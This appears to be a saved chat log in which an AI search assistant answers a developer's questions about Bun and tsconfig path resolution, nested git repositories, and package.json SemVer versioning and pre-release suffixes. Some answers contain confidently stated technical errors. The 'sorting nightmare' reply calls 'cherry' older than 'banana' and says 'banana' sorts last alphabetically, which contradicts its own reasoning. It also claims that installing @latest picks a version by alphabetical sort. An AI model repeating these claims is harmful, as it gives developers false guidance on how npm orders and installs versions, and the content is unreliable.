## what if i import sth by tsconfig baseurl anyway, will bun resolve it

what if i import sth by tsconfig baseurl anyway, will bun resolve it

8:06 PM

<mark><strong><span>Yes, Bun natively supports and automatically resolves<span> </span></span><code dir="ltr">tsconfig.json</code><span> </span>mappings</strong><span> </span>without requiring external plugins</mark> like `tsconfig-paths`. [link](https://bun.com/guides/runtime/tsconfig-paths)

However, because Bun acts as a drop-in replacement for the Node.js/TypeScript ecosystem, it handles `baseUrl` and `paths` with a specific catch:

### 1. `paths` mappings are fully supported

If you map specific directories via `paths`, Bun resolves them cleanly out of the box: [link](https://oneuptime.com/blog/post/2026-01-31-bun-typescript/view)

json

```
// tsconfig.json
{
  "compilerOptions": {
    "baseUrl": ".",
    "paths": {
      "@/*": ["src/*"]
    }
  }
}
```

Use code with caution.

If you write `import { foo } from "@/utils"`, Bun handles it perfectly. [link](https://oneuptime.com/blog/post/2026-01-31-bun-typescript/view)

### 2. Bare `baseUrl` relies on modern TypeScript rules

Modern TypeScript and standard runtime ecosystems (including Bun) highly discourage relying _exclusively_ on a bare `baseUrl` (e.g., using `import { foo } from "components/foo"` without an alias) because it pollutes and conflicts with the standard `node_modules` lookups. [link](https://www.typescriptlang.org/tsconfig/baseUrl.html)

If you use **just** `baseUrl` without explicit `paths`, ensure you configure your `moduleResolution` to a modern value like `"bundler"` or `"node16"` so Bun can traverse it cleanly: [link](https://github.com/oven-sh/bun/issues/29590)

json

```
{
  "compilerOptions": {
    "moduleResolution": "bundler",
    "baseUrl": "./src"
  }
}
```

Use code with caution.

### The Symlink Trap ⚠️

Be careful when mixing **symlinks** (from your previous question) and **tsconfig paths**.

If Bun encounters an import statement inside a symlinked file:

1. Bun resolves the symlink to its **real path** on disk first.
2. It then looks for the closest `tsconfig.json` relative to that **real path**.

If that symlinked file attempts to import via an absolute path alias (like `@/utils` or `components/utils`), it might fail with a "Module not found" error because it is searching for the `tsconfig.json` of its _original location_, not your active project's root folder. To prevent this, you would use the runtime flag from before: [link](https://github.com/oven-sh/bun/issues/4774)

bash

```
bun --preserve-symlinks index.ts
```

Use code with caution.

Are you trying to resolve imports from a **local workspace / monorepo package** that you've symlinked, or are you just trying to clean up deep relative paths (`../../../../`) in a **single project**?

- [link](https://github.com/oven-sh/bun/issues/4774)\
  GitHub\
  Bun doesn't support tsconfig.json which consist of references ...\
  I am facing a similar issue bun not with tsconfig directly... Please tell me if I need to create another issue or if I misundersta...
- [link](https://oneuptime.com/blog/post/2026-01-31-bun-typescript/view)\
  OneUptime\
  How to Use TypeScript with Bun - OneUptime\
  Path aliases make your imports cleaner and your codebase more maintainable. Configure them in tsconfig. json and Bun will resolve ...
- [link](https://bun.com/guides/runtime/tsconfig-paths)\
  Bun\
  Re-map import paths | Bun Guides\
  Bun reads the paths field in your tsconfig.json to re-write import paths. This is useful for aliasing package names or avoiding lo...

Show all

## what if i import sth on tsconfig, which is symlinked to a centralized deps folder

what if i import sth on tsconfig, which is symlinked to a centralized deps folder

8:07 PM

If you import something using a `tsconfig.json` path alias (like `@deps/my-package`), and that alias points to a **symlink** that targets a centralized dependencies folder, <mark><strong>Bun will resolve it, but it will immediately evaluate the symlink and run the files from the centralized folder's context.</strong></mark>

This can trigger a classic module-resolution breakdown. Here is exactly what happens and how to handle it.

***

### The Breakdown: How Bun Processes It

Imagine you have this setup:

json

```
// Your project's tsconfig.json
{
  "compilerOptions": {
    "paths": {
      "@shared/*": ["./symlinks/central-deps/*"]
    }
  }
}
```

Use code with caution.

1. **The Alias Match:** Bun looks at `import { helper } from "@shared/utils"`. It matches it to your `tsconfig.json` paths.
2. **The Symlink Leap:** Bun goes to `./symlinks/central-deps/utils.ts`. It detects that `central-deps` is a symlink pointing to `/centralized-store/packages/utils.ts`.
3. **The Real Path Shift:** Bun **escapes the symlink** and reads the file directly from its real path on disk: `/centralized-store/packages/utils.ts`. [link](https://github.com/oven-sh/bun/issues/4044)

### The Danger: Sub-dependencies Fail

Once Bun is inside `/centralized-store/packages/utils.ts`, it behaves as if it lives there. [link](https://github.com/oven-sh/bun/issues/4044)

If `utils.ts` contains any relative imports (e.g., `import { logger } from "../logger"`) or imports a third-party dependency like `lodash`, **Bun will look for them inside `/centralized-store/`, not your active project directory**. If `/centralized-store/` doesn't have a `node_modules` folder with those dependencies, Bun will crash with a **"Module not found"** error. [link](https://github.com/oven-sh/bun/issues/4044)

***

### How to Fix It

#### Solution 1: Use Bun's native Workspace features (Recommended)

If your centralized dependencies folder is a local monorepo or a directory of packages you manage, stop using manual symlinks and `tsconfig` paths to point to them. Instead, let Bun manage the linking natively via [Bun Workspaces](https://bun.com/docs/install/workspaces).

Configure your project's `package.json` to point directly to the centralized directory:

json

```
{
  "name": "my-project",
  "workspaces": [
    "../centralized-store/packages/*"
  ]
}
```

Use code with caution.

Run `bun install`. Bun will automatically create proper, robust symlinks inside your local `node_modules` that it knows how to resolve cleanly, completely eliminating the need for custom `tsconfig` path aliases for those packages. [link](https://github.com/microsoft/TypeScript/issues/63743)

#### Solution 2: Force Bun to Preserve Symlinks

If you must stick to the `tsconfig` path + symlink architecture, you must force Bun to stop escaping the symlink path. Run your script with the `--preserve-symlinks` flag: [link](https://github.com/oven-sh/bun/issues/4044)

bash

```
bun --preserve-symlinks index.ts
```

Use code with caution.

This forces Bun to treat `/symlinks/central-deps/` as a real, literal directory inside your project. Any relative imports or module lookups originating from the centralized files will look for `node_modules` relative to your project folder instead of the real global directory. [link](https://www.typescriptlang.org/tsconfig/preserveSymlinks.html)

Are these centralized dependencies **third-party packages** (like a shared `node_modules` cache) or are they **your own shared local code/packages**? Let me know so I can suggest the cleanest project structure.

- [link](https://github.com/oven-sh/bun/issues/4044)\
  GitHub\
  Bun equivalent of Node's \`--preserve-symlinks\` · Issue #4044\
  By default Node, and evidently also Bun, resolves imports inside symlink'd files/folders differently than TypeScript's default.
- [link](https://www.reddit.com/r/typescript/comments/1w48ts6/what%5Fdid%5Fyour%5Fteam%5Factually%5Fsettle%5Fon%5Finstead%5Fof/)\
  Reddit\
  what did your team actually settle on instead of ../../../../ imports ...\
  what did your team actually settle on instead of ../../../../ imports. our rule is no parent relative imports outside the current ...
- [link](https://github.com/microsoft/TypeScript/issues/63743)\
  GitHub\
  Project references resolve a symlinked sibling's raw source instead ...\
  This is intentional and matches npm, yarn, and pnpm workspace behavior. symlink workspace-local sibling packages by default, the s...

Show all

# can i git init inside a git repo and add commit push normally

8:31 PM

<mark><strong>Yes, you can run<span> </span><code dir="ltr">git init</code><span> </span>inside an existing Git repository, but it creates a nested repository (a repo within a repo) which usually leads to confusion.</strong></mark>

While you can technically add, commit, and push normally _within_ that specific subfolder, how Git handles it depends entirely on which folder your terminal is currently sitting in.

Here is exactly what happens and how to manage it:

### 1. Working inside the inner repository

If you `cd` into the new inner folder where you ran `git init`, **it will behave like a completely normal, independent repository**. [link](https://www.reddit.com/r/webdev/comments/yhie92/git%5Frepo%5Finside%5Fof%5Fanother%5Fgit%5Frepo%5Fis%5Fthis%5Fan/)

- `git add` and `git commit` will only save changes to the inner repo.
- `git push` will work perfectly, provided you connect it to its own remote URL using `git remote add origin <url>`. [link](https://www.reddit.com/r/git/comments/5osrma/still%5Fa%5Flittle%5Funfamiliar%5Fwith%5Fgithow%5Fshould%5Fi/)

### 2. What the outer repository sees

If you step back out into the main (outer) repository, Git will recognize that a new `.git` folder exists inside that subfolder. By default, **the outer repository will refuse to track any files inside the inner folder.**

Instead, the outer repo will treat it as a **Submodule** (or a "gitlink"). If you run `git add .` from the outer repo, it will only track the existence of the folder and its current commit ID, but _none of the actual files or code inside it_.

***

### ⚠️ Potential Issues & Best Practices

If you leave it as a nested repo without proper configuration, you will likely run into tracking issues or accidental "dirty submodule" errors. If you need a repository inside a repository, choose one of these three standard approaches:

- **Approach A: Add the inner repo to `.gitignore` (Most Common)**\
  If the inner repo is a completely separate project (like a frontend and backend repo nested together), add the inner folder's name to the outer repo's `.gitignore` file. This tells the outer repo to completely ignore it so they never interfere with each other. [link](https://www.reddit.com/r/webdev/comments/yhie92/git%5Frepo%5Finside%5Fof%5Fanother%5Fgit%5Frepo%5Fis%5Fthis%5Fan/)

- **Approach B: Use Git Submodules (Advanced)**\
  If the inner repo is a dependency that the outer repo needs to track properly, delete your manually created inner `.git` folder and add it via the official command from the outer repo root:\
  bash

<!---->

```
git submodule add <remote-url> path/to/subfolder
```

Use code with caution.

- **Approach C: Keep it as a single repository (Simplest)**\
  If you don't actually need two separate GitHub repositories, **do not run `git init` again.** Just create the subfolder normally. The outer Git repository will automatically track all folders and files inside it without any extra setup.

To help you set this up perfectly, tell me: **What is your main goal for nesting these repositories?** (e.g., keeping two separate projects together, managing a template, or just organizing files?)

- [link](https://www.reddit.com/r/webdev/comments/yhie92/git%5Frepo%5Finside%5Fof%5Fanother%5Fgit%5Frepo%5Fis%5Fthis%5Fan/)\
  Reddit\
  Git repo inside of another git repo\
  I searched but could not find an explanation. \* armahillo • 4y ago submodules is the correct way to do it. consider this very triv...

- [link](https://stackoverflow.com/questions/2337281/how-do-i-do-an-initial-push-to-a-remote-repository-with-git)\
  Stack Overflow\
  How do I do an initial push to a remote repository with Git?\
  This question does not show any research effort; it is unclear or not useful. Save this question. Show activity on this post. I've...

- [link](https://www.reddit.com/r/git/comments/5osrma/still%5Fa%5Flittle%5Funfamiliar%5Fwith%5Fgithow%5Fshould%5Fi/)\
  Reddit\
  Still a little unfamiliar with git...how should I push from ... - Reddit\
  Yes. Yes it does. Shadow14l • 10y ago cd /home/eric/electron/ git init git add . git commit -m "Initial commit" git remote add ori...

# what i write version: 0.0 in package json

## what i write version: 0.0 in package json

8:41 PM

In your **`package.json`** file, you cannot write just `0.0`. The file relies on the **Semantic Versioning (SemVer)** standard, which strictly requires a **three-number format**: `MAJOR.MINOR.PATCH`. [link](https://docs.npmjs.com/cli/v9/configuring-npm/package-json)

Because `0.0` only has two numbers, package managers like `npm` or `yarn` will reject it and throw an **"Invalid version" error**. [link](https://github.com/inveniosoftware/invenio-assets/issues/13)

### What you should write instead:

- **`"version": "0.0.0"`** – Use this if you are using automated tools (like `semantic-release`) that calculate your version dynamically every time you publish. It serves as a placeholder. [link](https://github.com/semantic-release/semantic-release/issues/211)
- **`"version": "0.1.0"`** – **This is the industry standard** for a brand-new project. The `0` means the project is in initial development, and the `1` represents your first minor release of features.
- **`"version": "1.0.0"`** – Use this if your code is stable, ready for production, or if you want standard version ranges (like `^`) to work normally right from the start. [link](https://stackoverflow.com/questions/3728626/what-to-use-as-an-initial-version)

### Where to put it:

Make sure it is wrapped in double quotes inside your root JSON object:

json

```
{
  "name": "your-project-name",
  "version": "0.1.0",
  "private": true
}
```

Use code with caution.

Are you setting up this version because you plan to **publish this package to npm**, or is it just for a **local/private project**? I can help you pick the best versioning strategy based on your goal.

- [link](https://stackoverflow.com/questions/22137778/what-does-mean-in-package-json-versioning)\
  Stack Overflow\
  What does "^" mean in package.json versioning?\
  When using caret operators, anything from the specified version (including prerelease) will be supported up to, but not including,
- [link](https://stackoverflow.com/questions/3728626/what-to-use-as-an-initial-version)\
  Stack Overflow\
  What to use as an initial version? \[closed]\
  Comments Add a comment 2 When choosing version numbers for an npm package, be aware that for dependencies listed in package.json s...
- [link](https://github.com/semantic-release/semantic-release/issues/211)\
  GitHub\
  Option to write version to package.json #211\
  Activity \* timotgl commented timotgl on Jul 20, 2016 I currently have the problem that two repos A and B use semantic-release and ...

Show all

## can it work if i write 0.0.0

can it work if i write 0.0.0

8:41 PM

<mark><strong><span>Yes,<span> </span></span><code dir="ltr">"version": "0.0.0"</code><span> </span>will work perfectly fine</strong></mark> and is syntactically valid in a `package.json` file.

Because it follows the required three-number format (`MAJOR.MINOR.PATCH`), package managers like `npm` and `yarn` will accept it without throwing errors.

### When should you use 0.0.0?

- **Automated Versioning:** It is commonly used as a temporary placeholder if you use tools like `semantic-release` or GitHub Actions to automatically calculate and overwrite the version number before publishing.
- **Purely Private Projects:** If you have `"private": true` in your file and never plan to publish it to a registry, you can leave it at `0.0.0` indefinitely.

### A quick warning on npm publishing:

If you try to publish a package to the public `npm` registry with `0.0.0`, it will technically upload. However, if you make updates later, you cannot publish `0.0.0` again. You will have to manually bump it to something higher, like `0.0.1`.

To help you set this up correctly, let me know:

- Is this a **private application** (like a website or app), or are you building a **reusable library/package**?
- Do you plan to **automate your deployments**, or are you managing version changes **manually**?

## why do they enforce semver

Package managers enforce **Semantic Versioning (SemVer)** <mark>to solve<span> </span><strong>"Dependency Hell"</strong></mark>. [link](https://docs.npmjs.com/about-semantic-versioning/)

In modern software development, your code depends on dozens of packages, and each of _those_ packages depends on dozens more. Without a strict, predictable rulebook for version numbers, keeping an application stable while updating it would be nearly impossible. [link](https://stackoverflow.com/questions/76417762/package-json-vs-package-lock-json-vs-semantic-versioning)

The `package.json` file uses SemVer to enforce three core behaviors:

### 1. It acts as a safety contract for machines

When you install a package, `npm` or `yarn` typically prefixes the version with a character like a caret (`^`) or tilde (`~`): [link](https://www.youtube.com/watch?v=3GmNhGBow7Q)

- `"express": "^4.17.1"` [link](https://medium.com/@kaiqueperezz/the-power-of-semantic-versioning-how-npm-and-yarn-make-your-life-easier-3a24e4c4fa83)

The caret symbol tells the package manager: _"It is safe to automatically download any future version of Express, **as long as the first number (4) doesn't change**."_ [link](https://stackoverflow.com/questions/71477984/what-is-the-exact-use-of-semver-notation-in-package-json-file)

The machine can only safely make this decision because SemVer guarantees what each number means: [link](https://blog.npmjs.org/post/162134793605/why-use-semver.html)

- **MAJOR (Breaking):** If this changes, code _will_ break. Package managers block automatic updates here.
- **MINOR (Features):** Safe to auto-update. New features were added, but existing code still works.
- **PATCH (Fixes):** Safe to auto-update. These are just backwards-compatible bug fixes. [link](https://www.youtube.com/watch?v=9dJ5EDpGLpo\&t=95)

### 2. Preventing "Dependency Drift"

If `0.0` were allowed, a package manager wouldn't know whether a transition to `0.1` meant a tiny typo fix or a massive rewrite that breaks your entire codebase. By forcing everyone to use three digits (`X.Y.Z`), the system ensures that every project in the ecosystem speaks the exact same versioning language. [link](https://aaronbos.dev/posts/npm-and-semantic-versioning)

### 3. Enabling Automation

Because SemVer is standardized, tools can read your code commits and dynamically calculate version numbers. If your automated pipeline detects you only fixed a bug, it bumps the patch number. If it detects a breaking change, it bumps the major version. This automation completely breaks if version numbers are written arbitrarily. [link](https://www.learningtypescript.com/articles/why-typescript-doesnt-follow-strict-semantic-versioning)

Are you running into an issue where **automated updates broke your app**, or are you figuring out **how to version your own package** for others to use?

- [link](https://docs.npmjs.com/about-semantic-versioning/)\
  npm Docs\
  About semantic versioning - npm Docs\
  Following the semantic versioning spec helps other developers who depend on your code understand the extent of changes in a given ...
- [link](https://stackoverflow.com/questions/76417762/package-json-vs-package-lock-json-vs-semantic-versioning)\
  Stack Overflow\
  package.json vs package-lock.json vs semantic versioning\
  So for reputable packages that properly follow semver, not every package follows semver, and some straight up lie and say they do ...
- [link](https://www.youtube.com/watch?v=9dJ5EDpGLpo\&t=95)\
  YouTube·Ivan and Code (Ivan Karaman)\
  Software versions made easy. Semantic versioning (semver)\
  Apr 1, 2022 — SemVer provides a predictable way to name software versions, ensuring clarity about the types of changes included in each release.\
  1m

Show all

## what if i name my way

If you want to use your own naming system (like `"version": "v2-alpha-final"` or `"version": "2026.09.27"`), you **cannot use the standard `"version"` field** in `package.json`.

If you try, `npm` and `yarn` will completely break, refuse to install your dependencies, and throw an **"Invalid Version"** error.

However, you _can_ still name things your way by using a few easy workarounds:

### Option 1: Put your custom name in a separate field (Best Choice)

The best way to keep your own versioning system without breaking Node.js is to leave a dummy version in the official field, and create your own custom field right below it.

json

```
{
  "name": "my-project",
  "version": "1.0.0",
  "customVersion": "Build-42-Beta-Final",
  "myReleaseName": "Cyberpunk-Update"
}
```

Use code with caution.

- **Why this works:** `npm` completely ignores fields it doesn't recognize. Your app can still read `customVersion` or `myReleaseName` in your code by importing the JSON file (`const pkg = require('./package.json')`).

### Option 2: Use SemVer-compliant custom names

SemVer actually allows you to add custom text to the end of a version number using a hyphen (`-`) or a plus sign (`+`). If you keep the three numbers at the front, you can write almost whatever you want at the end:

- **`"version": "1.0.0-beta.apple"`** (Tells npm it is a pre-release version named "apple")
- **`"version": "1.0.0+build.1042.marketing"`** (Tells npm this is build metadata)

### Why is npm so strict about this?

Node.js relies entirely on a tool called **`node-semver`** to parse package files. When you type `npm install`, the engine runs code similar to this behind the scenes:

js

```
// If this returns false, npm crashes immediately
semver.valid("your-version-here");
```

Use code with caution.

Because the engine is hardcoded to validate this specific math format, it doesn't have the flexibility to understand custom text strings in that primary slot.

Are you trying to use a specific naming style, like **calendar dates (Year.Month.Day)** or **marketing names (like "v2-ultimate")**? I can show you exactly how to format it so Node.js accepts it.

## can i have many versions on the same semver by suffixing

No, you cannot have **multiple different releases** sharing the exact same `MAJOR.MINOR.PATCH` numbers just by changing the suffix, because of how package managers compare version numbers.

If you publish `1.0.0-alpha` and `1.0.0-beta`, `npm` treats them as **sequential steps**, not separate co-existing variations.

Here is how `npm` reads suffixes and how to handle your use case instead.

***

### How Suffixes Actually Work (The Trap ⚠️)

In SemVer, anything after a hyphen (`-`) is a **pre-release tag**. Package managers sort these alphabetically or numerically to figure out which one is the "newest."

If you try to use suffixes to create distinct variants of the same codebase, `npm` will see them in this strict chronological order:

text

```
1.0.0-alpha.1   (Oldest)
1.0.0-beta      (Newer than alpha)
1.0.0-rc.1      (Newer than beta)
1.0.0           (The final, official stable version)
```

Use code with caution.

If a user requests `^1.0.0`, they will only ever get the stable `1.0.0`. You cannot tell `npm` to give one user the `alpha` variant and another user the `beta` variant of `1.0.0` at the same time using just the version field.

***

### How to achieve multiple versions simultaneously

If you need to distribute different flavors, configurations, or environments of your package at the same time, you have two industry-standard options:

#### Option 1: Use npm "Dist Tags" (Best for releasing different streams)

Instead of changing the version text inside `package.json`, you use **npm distribution tags** when you publish. This allows you to point different labels to completely different version numbers.

- Users who type `npm install my-pkg` get the **`latest`** tag (`1.0.0`)
- Users who type `npm install my-pkg@beta` get the **`beta`** tag (`2.0.0-beta.1`)
- Users who type `npm install my-pkg@legacy` get the **`legacy`** tag (`0.8.4`)

#### Option 2: Change the Package Name (Best for distinct variants)

If your versions are actually different flavors of the project (for example: a standard version vs. a lightweight version, or an ES modules version vs. a CommonJS version), you should change the **`"name"`** field, not the version.

- `"name": "my-utility"` (Version `1.0.0`)
- `"name": "my-utility-core"` (Version `1.0.0`)
- `"name": "@my-company/my-utility-lite"` (Version `1.0.0`)

What kind of variations are you trying to create? If you can tell me what makes these versions **different from each other** (e.g., different features, experimental code, or targeting different environments), I can give you the exact command or setup to use.

## what if i name as 0.0.0(forever)-(version i like)

If you use **`"0.0.0-forever-(version-i-like)"`**, it will technically be **valid SemVer syntax**, but it will behave in a highly disruptive way that will break standard package updates.

Because it starts with `0.0.0` and uses a hyphen, `npm` reads your custom name as a **pre-release modifier**. Here is exactly what happens if you do this:

### 1. It works, but it is locked in the past

Because your base version is `0.0.0`, package managers see your package as being in an "ultra-early, pre-release" state.

If you publish `0.0.0-v1` and then later publish `0.0.0-v2`, `npm` will sort them alphabetically. `v2` will be considered "newer" than `v1`. However, **neither of them will ever auto-update** for your users.

### 2. It breaks the caret (`^`) and tilde (`~`) symbols

The biggest drawback is that standard dependency matching completely breaks. By default, `npm` refuses to automatically install or update any package that has a pre-release tag unless a user explicitly asks for that exact string.

- If a user writes `"your-package": "^0.0.0"` in their `package.json`, `npm` **will refuse to download** `0.0.0-v1`.
- To install it, your users will be forced to type the exact, full string every single time: `npm install your-package@0.0.0-forever-v1`.

### 3. A Sneaky Alternative: Use the Build Metadata (`+`)

If you want a fixed SemVer base but want your custom name to actually show up _without_ locking your package into a restrictive "pre-release" state, use a plus sign (`+`) instead of a hyphen.

- **`"version": "1.0.0+forever-v1"`**
- **`"version": "1.0.0+forever-v2"`**

**The catch:** In SemVer, build metadata (everything after the `+`) is completely **ignored during version comparisons**. To `npm`, `1.0.0+v1` and `1.0.0+v2` are considered the exact same version. It will not know which one is newer, and it will not overwrite one with the other automatically.

What does the **"version you like"** actually look like? If you share an example of your preferred naming format, I can show you how to structure your deployment or `package.json` so it works smoothly.

## i mean 0.0.0-..., where 0.0.0 is forever fixed, and ... is absolutely at whim

If you keep **`0.0.0-` completely fixed** and change the trailing suffix absolutely at your whim, **`npm` will accept the syntax, but it will cause severe, unpredictable behavior** due to how computers sort text strings.

When you use a hyphen, `npm` uses alphabetical and numerical ASCII rules to decide which version is "newer." If your suffixes are completely random or don't follow a strict sorting pattern, `npm` will mix up your release order.

### The Sorting Nightmare (How npm sees it)

Imagine you release three versions of your app in this exact chronological order over three weeks:

1. **`0.0.0-banana`** (Week 1)
2. **`0.0.0-apple`** (Week 2)
3. **`0.0.0-cherry`** (Week 3)

Even though you released `cherry` last, **`npm` will insist that `cherry` is older than `banana`** because "b" comes after "a" alphabetically.

If a user types `npm install your-package@latest`, `npm` will look at the alphabet, see that "banana" comes last alphabetically among those three, and mistakenly install your oldest Week 1 code.

### Summary of What Happens

| What You Want                  | What Actually Happens                                                                                                     |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------- |
| **Valid JSON?**                | **Yes.** It won't crash your local build tool.                                                                            |
| **Auto-updates (`^` or `~`)?** | **No.** `npm` completely blocks auto-updates on `0.0.0` pre-releases.                                                     |
| **Predictable deployment?**    | **No.** If you publish to a registry, `npm` will sort your versions alphabetically, scrambled out of chronological order. |

### The Real Fix: Use an "Epoch" Prefix

If you want total freedom with your text suffix but still want a package manager to understand which release is actually the newest, you must prefix your whim with a **strictly increasing number** (like a counter or a date stamp).

- `0.0.0-1-apple`
- `0.0.0-2-banana`
- `0.0.0-3-cherry`

By adding `1-`, `2-`, `3-`, you trick the package manager. It sees the incrementing number first, sorts it perfectly, and completely ignores whatever random text you decide to write after it.

What kind of **text phrases** are you hoping to use in your suffix? If you give me an example of two or three names you want to use, I can show you exactly how to format them with a prefix so they don't break your project's sorting order.

## do they sort suffix normally, like 1 to 9 than 10 to 19, instead of 1 and then 10 to 19 and then 2

Yes, **`npm` handles numbers inside suffixes properly** (e.g., `10` is recognized as greater than `2`). <mark>It does<span> </span><strong>not</strong><span> </span>sort them strictly alphabetically</mark> (where `10` would come before `2`).

However, this only works if the number stands on its own as a distinct block. If you mix letters and numbers together without separating them, it falls back to alphabetical sorting and breaks.

### The SemVer Sorting Rule

SemVer splits your suffix into separate chunks using the **dot (`.`) separator**.

- If a chunk contains **only numbers**, `npm` sorts it numerically.
- If a chunk contains **letters or symbols**, `npm` sorts it alphabetically.

Here is a direct comparison of how `npm` evaluates different suffix setups:

| How You Format Your Suffix                           | How `npm` Sorts It (Oldest to Newest) | Does it work correctly?                                                                                                  |
| ---------------------------------------------------- | ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| **Separated by dots**`0.0.0-build.2``0.0.0-build.10` | 1. `0.0.0-build.2`2. `0.0.0-build.10` | **Yes.** Because `2` and `10` are isolated by dots, `npm` knows 10 is bigger than 2.                                     |
| **Smashed together**`0.0.0-build2``0.0.0-build10`    | 1. `0.0.0-build10`2. `0.0.0-build2`   | **No.** Because there is no dot, it evaluates the whole string alphabetically. "b-u-i-l-d-1" comes before "b-u-i-l-d-2". |

### Summary for your "whim" strategy

If you want to use a numerical counter alongside your custom names, **always separate the counter with a dot**.

- ❌ **Avoid:** `0.0.0-version2-banana` and `0.0.0-version10-apple` _(This will break sorting)_
- **Use:** `0.0.0-2.banana` and `0.0.0-10.apple` _(This will sort perfectly, placing 10 after 2)_

Are you planning to write these version strings **manually** as you build, or are you trying to write a **script or GitHub Action** to automatically generate them? I can give you a quick template depending on your workflow.

# what if i declare deps i never use in packagejson

Declaring dependencies in your `package.json` that you never actually `import` or `require` in your code won't completely break your application, but it introduces several inefficiencies and hidden risks. [link](https://www.reddit.com/r/node/comments/sqleqz/if%5Fpackagejson%5Freferences%5Fsome%5Fpackage%5Fbut%5Fthere/)

The exact consequences depend entirely on whether you are building a **web application** (like React, Next.js, or Vue) or publishing an **npm package/library**. [link](https://medium.com/openclassrooms-product-design-and-engineering/guide-to-managing-npm-packages-in-your-package-json-d315fe2ccab0)

***

### 1. If you are building a Web Application (Frontend)

Modern bundlers (like Webpack, Vite, or Rollup) use a process called **tree-shaking**. Tree-shaking analyzes your code's import tree and strips out anything that isn't explicitly used. [link](https://www.reddit.com/r/reactjs/comments/111hbws/are%5Fall%5Fdependencies%5Fins%5Fpackagejson%5Fwill%5Fbe/)

- **Production Bundle Size:** **Usually unaffected.** Because the bundler ignores modules that aren't imported, the unused package won't be compiled into your final JavaScript production bundle. [link](https://www.reddit.com/r/reactjs/comments/111hbws/are%5Fall%5Fdependencies%5Fins%5Fpackagejson%5Fwill%5Fbe/)
- **Slower CI/CD & Deployments:** Every time your pipeline runs `npm install` or `npm ci`, it still has to download, extract, and cache that unused package. This balloons your `node_modules` size and slows down your deployment times. [link](https://www.reddit.com/r/git/comments/1lkjtx1/any%5Fway%5Fto%5Fdeal%5Fwith%5Fannoying%5Fpackagejson%5Fand/)
- **Phantom Security Vulnerabilities:** Even if a package isn't used in your app, security tools like `npm audit` or Dependabot will flag its vulnerabilities. You will waste time fixing security flaws for code that your application doesn't even run. [link](https://codefinity.com/blog/Should-I-Commit-package-lock.json)

### 2. If you are building an Node.js Backend or API

Unlike frontend apps, standard Node.js applications don't always use a bundler; they often run directly against the local `node_modules` folder.

- **Server Disk Space:** The unused package—and all of _its_ nested dependencies—will live permanently on your production server, wasting storage space.
- **No Runtime Impact:** Node.js only loads modules into memory when `require()` or `import` is executed. A dead declaration won't consume runtime CPU or RAM. [link](https://stackoverflow.com/questions/57801093/how-to-install-npm-dependencies-which-arent-in-package-json)

### 3. If you are publishing an NPM Library

This is where it causes the most harm. If you publish a package to the npm registry with unused items under `"dependencies"`:

- **Bloat for Users:** Anyone who installs your library will be **forced to download** those unused packages. You are passing your supply chain bloat onto your end-users. [link](https://www.youtube.com/watch?v=fbcMoP8C3tc)

***

### 🛠️ How to clean them up automatically

You don't need to hunt through your files manually to find dead weight. You can use specialized tooling to locate them instantly: [link](https://www.youtube.com/watch?v=eDcnJM2XIo4)

1. Run **`depcheck`** via npx without installing it:\
   bash

<!---->

```
npx depcheck
```

Use code with caution.\
This tool scans your entire project, matches your code imports against your `package.json`, and outputs a list of "Unused dependencies".
2\. Once identified, safely remove them: [link](https://www.youtube.com/watch?v=eDcnJM2XIo4)\
bash

```
npm uninstall <package-name>
```

Use code with caution.

Are you seeing **specific warnings** or **security vulnerabilities** right now, or are you just tidying up a codebase? Let me know if you are working on a **frontend app** or an **npm package**, and I can point you toward the best cleanup tool.

- [link](https://www.reddit.com/r/reactjs/comments/111hbws/are%5Fall%5Fdependencies%5Fins%5Fpackagejson%5Fwill%5Fbe/)\
  Reddit\
  Are all dependencies ins package.json will be included in final build?\
  Feb 13, 2023 — Conclusion Aegis8080 • 4y ago Although extra packages won't affect production, don't forget to uninstall unused packages from time...
- [link](https://medium.com/openclassrooms-product-design-and-engineering/guide-to-managing-npm-packages-in-your-package-json-d315fe2ccab0)\
  Medium\
  Guide to managing npm packages in your package.json\
  Dependencies vs devDependencies When you install a new package in your project, you have the option to either save it in dependenc...
- [link](https://www.reddit.com/r/node/comments/sqleqz/if%5Fpackagejson%5Freferences%5Fsome%5Fpackage%5Fbut%5Fthere/)\
  Reddit\
  If package.json references some package but there is no require, am I safe to remove? : r/node\
  Feb 12, 2022 — This is for informational purposes only. You can consult your local medical authority for advice. You can remove unused dependenci...

Show all

# can i set baseurl to parent folder in tsconfig

## can i set baseurl to parent folder in tsconfig

**Yes, you can set `baseUrl` to a parent folder** in your `tsconfig.json` file. You do this by using the standard relative parent path notation **`".."`**. [link](https://echobind.com/post/deep-dive-into-extending-tsconfig-json)

Here is an example configuration:

json

```
{
  "compilerOptions": {
    "baseUrl": ".."
  }
}
```

Use code with caution.

### ⚠️ A Better Alternative: Using `paths` without `baseUrl`

While setting `baseUrl` to a parent directory works, the TypeScript team [no longer recommends using `baseUrl`](https://www.typescriptlang.org/tsconfig/baseUrl.html) unless you are working with legacy AMD module loaders. [link](https://www.typescriptlang.org/tsconfig/baseUrl.html)

If your goal is to create clean import aliases to a parent folder, you can use the **`paths` property by itself** (available in TypeScript 4.1+). When `baseUrl` is absent, TypeScript resolves paths relative to the location of the `tsconfig.json` file itself. [link](https://www.typescriptlang.org/tsconfig/paths.html)

Here is how you can map a parent directory using only `paths`:

json

```
{
  "compilerOptions": {
    "paths": {
      "@parent/*": ["../*"]
    }
  }
}
```

Use code with caution.

This lets you comfortably import files from your parent folder like this, without relying on `baseUrl`:

typescript

```
import { SharedHelper } from '@parent/helpers/shared';
```

Use code with caution.

If you run into issues, let me know:

- What **build tool or bundler** (like Vite, Webpack, or Next.js) you are using, as they sometimes require extra configuration to understand parent path mappings.

- Your **project directory layout**, so I can give you the exact path syntax.

- [link](https://www.typescriptlang.org/tsconfig/baseUrl.html)\
  TypeScript\
  TSConfig Option: baseUrl - TypeScript\
  Sets a base directory from which to resolve bare specifier module names. This feature was designed for use in conjunction with AMD...

- [link](https://stackoverflow.com/questions/74607650/absolute-path-does-not-work-base-url-in-tsconfig)\
  Stack Overflow\
  absolute path does not work (base url in tsconfig \[duplicate]\
  Nov 28, 2022 — 4 Comments Add a comment jrs jrs Over a year ago Hey, this looks like a valid solution. But, I am just wondering - shouldn't I be ...

- [link](https://echobind.com/post/deep-dive-into-extending-tsconfig-json)\
  Echobind\
  Deep Dive Into Extending tsconfig.json\
  See how the paths all point to the parent folder? That means we always have to define baseUrl , rootDir , outDir , include , and e...

Show all

## can i have paths wo @ prefix

